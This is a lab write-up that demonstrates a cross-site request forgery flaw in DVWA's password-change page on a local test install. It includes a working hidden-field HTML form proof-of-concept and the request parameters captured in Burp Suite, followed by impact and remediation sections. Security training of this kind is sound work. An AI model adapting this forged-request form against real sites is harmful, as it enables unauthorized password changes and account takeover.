# 🔄 Cross-Site Request Forgery (CSRF)

## 📌 Overview

Cross-Site Request Forgery (CSRF) is a web vulnerability in which an attacker can cause an authenticated user's browser to send an unintended request to a vulnerable application.

In this lab, DVWA was configured with the **Low** security level. The password-change functionality was tested to determine whether the request could be triggered without a CSRF protection token.

---

## 🎯 Target

* **Application:** Damn Vulnerable Web Application (DVWA)
* **Vulnerability:** Cross-Site Request Forgery (CSRF)
* **Security Level:** Low
* **Environment:** Local Windows XAMPP Lab
* **Target URL:** `http://127.0.0.1/DVWA/`

---

## 🎯 Objective

The objective was to determine whether an authenticated user's password could be changed through a crafted request originating from a separate HTML page.

---

## 🧪 Step 1: Normal Password Change

A legitimate password-change request was submitted through the DVWA CSRF page.

The new password and confirmation were set to:

```text
Test123!
```

The application returned:

```text
Password Changed.
```

## 🕵️ Step 2: Burp Suite Request

Burp Suite was used to inspect the normal password-change HTTP request.

The request contained parameters similar to:

```text
password_new=Test123!
password_conf=Test123!
Change=Change
```

No CSRF token was observed in the request.

## 🧪 Step 3: CSRF Proof of Concept

A local HTML page was created to submit a password-change request to the DVWA CSRF endpoint.

The proof-of-concept used:

```html
<form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="CSRFtest123!">
    <input type="hidden" name="password_conf" value="CSRFtest123!">
    <input type="hidden" name="Change" value="Change">
    <input type="submit" value="Submit">
</form>
```

The PoC was opened in the same browser while the DVWA authenticated session was active.

After submitting the form, DVWA returned:

```text
Password Changed.
```

This demonstrated that the password-change action could be triggered through the crafted request.

## 🕵️ Step 4: Burp Suite PoC Evidence

Burp Suite was used to inspect the request generated by the CSRF PoC.

The request contained the password-change parameters:

```text
password_new=CSRFtest123!
password_conf=CSRFtest123!
Change=Change
```

No anti-CSRF token was present.

## ✅ Vulnerability Confirmation

The vulnerability was confirmed because:

1. The password-change functionality accepted a request without a CSRF token.
2. A crafted HTML form could generate the password-change request.
3. The request was processed while the authenticated DVWA session was active.
4. The application returned `Password Changed.` after the crafted request.

---

## ⚠️ Impact

A CSRF vulnerability affecting password-change functionality can potentially allow an attacker to cause an authenticated victim to perform an unintended account action.

Potential impact can include:

* Unauthorized password changes
* Account takeover when combined with other conditions
* Unauthorized modification of account settings
* Other state-changing actions performed using the victim's authenticated session

---

## 🛡️ Remediation

Recommended defenses include:

* Implement unpredictable, per-session CSRF tokens.
* Validate the CSRF token on every state-changing request.
* Use `SameSite` cookie attributes where appropriate.
* Validate the `Origin` and/or `Referer` headers as an additional defense.
* Require re-authentication for highly sensitive account changes such as password updates.
* Avoid using GET requests for state-changing operations.

---

## 📌 Conclusion

The DVWA CSRF vulnerability was successfully demonstrated.

A legitimate password-change request was first tested and inspected with Burp Suite. A separate local HTML proof-of-concept was then used to generate a crafted password-change request while the authenticated session was active. The application processed the request without requiring a CSRF token, demonstrating the vulnerability at the configured Low security level.
